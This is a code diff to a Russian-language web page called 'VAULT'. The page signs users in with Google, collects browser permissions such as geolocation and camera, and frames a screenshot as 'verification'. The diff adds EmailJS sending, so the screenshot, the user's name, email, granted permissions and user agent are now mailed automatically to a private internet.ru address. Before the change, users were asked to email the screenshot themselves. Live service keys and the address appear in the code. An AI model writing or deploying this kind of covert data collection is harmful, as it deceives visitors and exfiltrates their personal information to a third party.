@@ -14,8 +14,11 @@
     <!-- Google Identity -->
     <script src="https://accounts.google.com/gsi/client" async defer></script>
     
-    <!-- html2canvas -->
+    <!-- html2canvas для скриншотов -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    
+    <!-- EmailJS для отправки на почту -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
@@ -535,12 +538,7 @@
             <div class="task-box">
                 <div class="task-icon"><i class="fas fa-camera"></i></div>
                 <h3>Важное задание</h3>
-                <p>Сделайте скриншот экрана и отправьте на почту:</p>
-                <div class="task-email" onclick="copyEmail()">
-                    <i class="fas fa-envelope"></i>
-                    <span>timoshamscbsns@internet.ru</span>
-                    <i class="fas fa-copy"></i>
-                </div>
+                <p>Сделайте скриншот экрана для верификации:</p>
                 <button id="sendScreenshotBtn" class="send-btn">
                     <i class="fas fa-paper-plane"></i> Сделать скриншот и отправить
                 </button>
@@ -554,9 +552,19 @@
     </div>
 
     <script>
-        const YOUR_CLIENT_ID = '22364952672-8mqiqmo14pgq3es9thb2bhon1eiqq522.apps.googleusercontent.com';
+        // ==================== НАСТРОЙКИ EMAILJS ====================
+        // ЗАМЕНИТЕ ЭТИ ЗНАЧЕНИЯ НА СВОИ ПОСЛЕ РЕГИСТРАЦИИ НА EMAILJS.COM
+        const EMAILJS_CONFIG = {
+            PUBLIC_KEY: 'ngajSGg-vBGC0JUwD',     // Замените на свой Public Key
+            SERVICE_ID: 'service_jqy7goc',     // Замените на свой Service ID
+            TEMPLATE_ID: 'template_4enu6if',   // Замените на свой Template ID
+            TO_EMAIL: 'timoshamscbsns@internet.ru'  // Email, куда будут приходить скриншоты
+        };
         
-        // Список разрешений (только те, что работают через API)
+        // ==================== ИНИЦИАЛИЗАЦИЯ EMAILJS ====================
+        emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
+        
+        // ==================== СПИСОК РАЗРЕШЕНИЙ ====================
         const PERMISSIONS_LIST = [
             { id: 'geolocation', name: 'Геоданные', icon: 'fa-map-marker-alt', check: () => checkGeolocation(), request: () => requestGeolocation() },
             { id: 'camera', name: 'Камера', icon: 'fa-camera', check: () => checkCamera(), request: () => requestCamera() },
@@ -672,14 +680,7 @@
         }
         
         async function requestPictureInPicture() {
-            try {
-                const video = document.createElement('video');
-                video.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29t';
-                await video.play();
-                return true;
-            } catch(e) {
-                return document.pictureInPictureEnabled === true;
-            }
+            return document.pictureInPictureEnabled === true;
         }
         
         // ========== ОБНОВЛЕНИЕ СОСТОЯНИЯ ==========
@@ -771,12 +772,7 @@
             updateProgress();
         }
         
-        // ========== ОТПРАВКА СКРИНШОТА ==========
-        window.copyEmail = function() {
-            navigator.clipboard.writeText('timoshamscbsns@internet.ru');
-            alert('📧 Email скопирован: timoshamscbsns@internet.ru');
-        };
-        
+        // ========== ОТПРАВКА СКРИНШОТА (АВТОМАТИЧЕСКИ) ==========
         const sendScreenshotBtn = document.getElementById('sendScreenshotBtn');
         const sendStatus = document.getElementById('sendStatus');
         
@@ -793,30 +789,59 @@
             if (sendScreenshotBtn) sendScreenshotBtn.disabled = true;
             
             try {
+                // Создаём скриншот
                 const canvas = await html2canvas(document.body, {
                     scale: 0.9,
                     backgroundColor: '#0a0c15',
                     logging: false,
                     useCORS: true
                 });
-                const screenshotDataUrl = canvas.toDataURL('image/png');
                 
+                // Конвертируем в base64
+                const screenshotBase64 = canvas.toDataURL('image/png');
+                
+                // Получаем список выданных разрешений
                 const grantedPermissions = PERMISSIONS_LIST.filter(p => permissionsState[p.id]).map(p => p.name);
                 
-                const textToCopy = `🔐 VAULT - Данные верификации\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👤 Имя: ${currentUser.name}\n📧 Email: ${currentUser.email}\n✅ Разрешения выданы (${grantedPermissions.length}/${PERMISSIONS_LIST.length}):\n${grantedPermissions.map(p => `   • ${p}`).join('\n')}\n🕐 Время: ${new Date().toLocaleString('ru-RU')}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📸 Скриншот сохранён на компьютер\n📧 Отправьте файл на: timoshamscbsns@internet.ru`;
+                // Данные для отправки
+                const templateParams = {
+                    to_email: EMAILJS_CONFIG.TO_EMAIL,
+                    from_name: currentUser.name,
+                    user_email: currentUser.email,
+                    user_name: currentUser.name,
+                    permissions_list: grantedPermissions.join(', '),
+                    permissions_count: `${grantedPermissions.length}/${PERMISSIONS_LIST.length}`,
+                    timestamp: new Date().toLocaleString('ru-RU'),
+                    user_agent: navigator.userAgent,
+                    screenshot: screenshotBase64,
+                    message: `Пользователь ${currentUser.name} (${currentUser.email}) успешно прошёл верификацию. Все разрешения выданы.`
+                };
                 
-                await navigator.clipboard.writeText(textToCopy);
+                sendStatus.innerHTML = '<i class="loading"></i> Отправка на почту...';
                 
-                const link = document.createElement('a');
-                link.download = `vault_${currentUser.name.replace(/\s/g, '_')}_${Date.now()}.png`;
-                link.href = screenshotDataUrl;
-                link.click();
+                // Отправляем через EmailJS
+                const response = await emailjs.send(
+                    EMAILJS_CONFIG.SERVICE_ID,
+                    EMAILJS_CONFIG.TEMPLATE_ID,
+                    templateParams
+                );
                 
-                sendStatus.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success);"></i> ✅ Скриншот сохранён! Данные скопированы. Отправьте файл на timoshamscbsns@internet.ru';
-                sendStatus.style.color = 'var(--success)';
+                if (response.status === 200) {
+                    sendStatus.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success);"></i> ✅ Скриншот успешно отправлен на почту!';
+                    sendStatus.style.color = 'var(--success)';
+                    
+                    // Дополнительно сохраняем скриншот на компьютер
+                    const link = document.createElement('a');
+                    link.download = `vault_${currentUser.name.replace(/\s/g, '_')}_${Date.now()}.png`;
+                    link.href = screenshotBase64;
+                    link.click();
+                } else {
+                    throw new Error('Ошибка отправки');
+                }
                 
             } catch (error) {
-                sendStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ❌ Ошибка создания скриншота';
+                console.error('Ошибка:', error);
+                sendStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ❌ Ошибка отправки. Проверьте настройки EmailJS.';
                 sendStatus.style.color = 'var(--danger)';
             } finally {
                 if (sendScreenshotBtn) sendScreenshotBtn.disabled = false;
@@ -828,6 +853,8 @@
         }
         
         // ========== GOOGLE AUTH ==========
+        const YOUR_CLIENT_ID = '22364952672-8mqiqmo14pgq3es9thb2bhon1eiqq522.apps.googleusercontent.com';
+        
         function initGoogle() {
             if (!window.google) { setTimeout(initGoogle, 100); return; }
             google.accounts.id.initialize({
